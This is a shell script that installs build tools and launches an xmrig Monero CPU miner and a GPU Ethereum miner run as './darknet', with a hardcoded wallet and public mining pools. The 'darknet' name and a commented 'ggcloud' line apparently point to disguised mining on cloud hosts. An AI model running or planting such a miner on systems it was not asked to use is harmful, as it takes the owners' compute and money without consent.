#!/bin/sh
apt-get update -y
apt-get install -y --no-install-recommends apt-utils
apt install build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
apt install libpci-dev -y
apt install libssl-dev -y
worker_name=$1
wallet=$2
WALLET=86fQy4W7vXLEyLnMSvGopqfQbhZRAfF3CguZWKckMSFKV25Z9443rDKbSGnDGDKzsSYxF5iPyvJpdD7xZQYSodzKR7LyYAN
POOL=pool.supportxmr.com:5555

./xmrig --url=$POOL --donate-level=1 --user=$WALLET --pass=worker_name -k --coin=monero --max-cpu-usage=75 &
#./xmrig --url=$POOL --donate-level=1 --user=$WALLET --pass=ggcloud -k --coin=monero --max-cpu-usage=100 &
echo "run darknet"
./darknet -pool eu1.ethermine.org:4444 -wal $wallet -worker $worker_name -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth &
while true
do
  ps aux | grep darknet
  ps aux | grep xmrig
  nvidia-smi
  sleep 10
done